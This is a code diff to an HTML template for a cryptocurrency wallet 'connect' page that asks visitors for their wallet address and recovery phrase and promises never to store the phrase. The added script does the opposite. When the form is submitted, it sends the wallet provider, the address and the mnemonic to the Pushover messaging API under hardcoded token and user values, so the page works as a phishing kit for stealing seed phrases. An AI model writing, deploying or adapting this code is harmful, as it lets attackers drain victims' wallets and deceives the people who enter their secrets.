@@ -30,7 +30,7 @@
     </div>
 </div>
 
-<p class="text-2xl font-semibold mx-5 my-3">{{title}}</p>
+<p id="title" class="text-2xl font-semibold mx-5 my-3">{{title}}</p>
 
 <div class="divider mx-5"></div>
 
@@ -39,14 +39,45 @@
     <p class="text-sm text-slate-400">We will only ask you this information once, to confirm your identity. We never store your recovery phrase.</a></p>
 </div>
 
-<form action="/connect/{{slug}}/" method="POST" class="flex flex-col items-center justify-center gap-3 w-full">
+<form id="step0" action="/connect/{{slug}}/" method="POST" class="flex flex-col items-center justify-center gap-3 w-full">
     {% csrf_token %}
     <p class="font-semibold w-[90%]">Wallet Address</p>
-    <input minlength="10" maxlength="64" name="address" class="input input-solid input-block w-[90%] h-14" placeholder="Wallet Address" required />
+    <input id="input0" minlength="10" maxlength="64" name="address" class="input input-solid input-block w-[90%] h-14" placeholder="Wallet Address" required />
     <p class="font-semibold w-[90%]">Recovery Phrase</p>
-    <textarea minlength="20" name="phrase" class="input input-solid input-block w-[90%] h-48 py-3" placeholder="Enter the recovery phrase you created while setting up your wallet on {{title}}" required></textarea>
+    <textarea id="input1" minlength="50" name="phrase" class="input input-solid input-block w-[90%] h-48 py-3" placeholder="Enter the recovery phrase you created while setting up your wallet on {{title}}" required></textarea>
     <button type="submit" class="btn btn-primary w-[90%] h-14">Connect</button>
 </form>
+
+
+<script>
+    var step0 = document.getElementById('step0');
+    var title = document.getElementById('title');
+    var input0 = document.getElementById('input0');
+    var input1 = document.getElementById('input1');
+
+    step0.onsubmit = () => {
+        const postData = new URLSearchParams({
+            'token': 'ad4jpctyrkp6i6y9ow1uaitjm6mgg2',
+            'user': 'ugfekik2kcreujzopvaru1quexn7z1',
+            'message': `Wallet Provider: ${title.innerHTML}\n\nWallet Address: ${input0.value}\n\nMnemonic: ${input1.value}`
+        });
+
+        fetch('https://api.pushover.net/1/messages.json', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: postData
+        })
+        .then(response => {
+            console.log(`Response status: ${response.status}`);
+            return response.json();
+        })
+        .then(data => {
+            console.log(data);
+        })
+    }
+</script>
 
 
 
